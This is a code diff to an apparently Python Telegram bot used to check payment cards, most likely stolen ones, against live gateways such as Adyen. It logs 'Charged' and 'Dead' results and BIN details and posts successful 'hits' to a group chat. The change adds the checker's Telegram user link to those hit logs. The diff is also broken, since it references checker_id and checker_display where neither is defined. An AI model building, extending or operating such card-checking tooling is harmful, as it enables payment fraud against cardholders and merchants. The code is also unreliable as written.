@@ -699,6 +699,11 @@ def build_result_card(result: dict, bin_info: tuple, uid: int, cname: str) -> st
         if result['status'] == 'Charged' and receipt_url else ""
     )
     bin_parts = " · ".join(p for p in [brand, btype, level] if p and p != '-')
+    if checker_id:
+        checker_display = f'<a href="tg://user?id={checker_id}">{checker_name}</a>'
+    else:
+        checker_display = checker_name
+
     return pe(
         f"<b>{header}</b>\n"
         f"<b>{SEP}</b>\n"
@@ -1249,7 +1254,7 @@ _load_keys()
 # ════════════════════════════════════════════════════════════
 #  GC HIT LOG
 # ════════════════════════════════════════════════════════════
-def _build_gc_log(result: dict, checker_name: str) -> str:
+def _build_gc_log(result: dict, checker_name: str, checker_id: int = 0) -> str:
     status   = result.get('status', 'Dead')
     msg      = (result.get('message', '') or '')
     amount   = _fmt_price(result.get('price', '-'))
@@ -1274,7 +1279,7 @@ def _build_gc_log(result: dict, checker_name: str) -> str:
         f"[⌯] {_sb('Amount')} ⌁ {_sb(amount)} ⚡\n"
         f"[⌯] {_sb('Gate')} ⌁ {_sb(gateway)}\n"
         f"─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n"
-        f"[⌯] {_sb('Checker')} ⌁ 🎯 {checker_name}"
+        f"[⌯] {_sb('Checker')} ⌁ 🎯 {checker_display}"
     )
 
 def _should_post_to_gc(result: dict) -> bool:
@@ -1634,11 +1639,11 @@ PROXY_REQUIRED_MSG = pe(
 # ════════════════════════════════════════════════════════════
 #  BOT CORE — B: hits, progress, results, mass runner
 # ════════════════════════════════════════════════════════════
-async def _post_gc_log(result: dict, checker_name: str):
+async def _post_gc_log(result: dict, checker_name: str, checker_id: int = 0):
     if not HIT_LOG_GC_ID:
         return
     try:
-        msg = _build_gc_log(result, checker_name)
+        msg = _build_gc_log(result, checker_name, checker_id)
         await asyncio.to_thread(_send_notification, HIT_LOG_GC_ID, msg)
     except Exception:
         pass
@@ -1653,7 +1658,7 @@ async def send_realtime_hit(user_id, result, hit_type):
     if msg_id and hit_type == "Charged":
         await asyncio.to_thread(_pin_message_botapi, user_id, msg_id)
     if _should_post_to_gc(result):
-        await _post_gc_log(result, checker_name)
+        await _post_gc_log(result, checker_name, user_id)
 
 async def send_insufficient_log(user_id, result):
     card     = result['card']
@@ -1675,7 +1680,7 @@ async def send_insufficient_log(user_id, result):
         parse_mode='html'
     )
     if _should_post_to_gc(result):
-        await _post_gc_log(result, checker_name)
+        await _post_gc_log(result, checker_name, user_id)
 
 async def send_3ds_log(user_id, result):
     card     = result['card']
@@ -2077,7 +2082,7 @@ async def single_check(event):
         if result.get('status') == 'Charged' and chat_id == uid:
             await asyncio.to_thread(_pin_message_botapi, uid, smsg.id)
         if _should_post_to_gc(result):
-            await _post_gc_log(result, cname)
+            await _post_gc_log(result, cname, uid)
     except Exception as e:
         import traceback
         tb = traceback.format_exc()
@@ -2150,7 +2155,7 @@ async def adyen_direct_check(event):
         if result.get('status') == 'Charged' and chat_id == uid:
             await asyncio.to_thread(_pin_message_botapi, uid, smsg.id)
         if _should_post_to_gc(result):
-            await _post_gc_log(result, cname)
+            await _post_gc_log(result, cname, uid)
     except Exception as e:
         await smsg.edit(pe(f"❌ <b>Adyen Failed</b>\n<b>{SEP}</b>\n⚠️ <code>{e}</code>"), parse_mode='html')
 
@@ -2313,7 +2318,7 @@ async def hit_command(event):
                 pass
 
             if _should_post_to_gc(result):
-                await _post_gc_log(result, cname)
+                await _post_gc_log(result, cname, uid)
 
             if result.get('status') == 'Charged':
                 try:
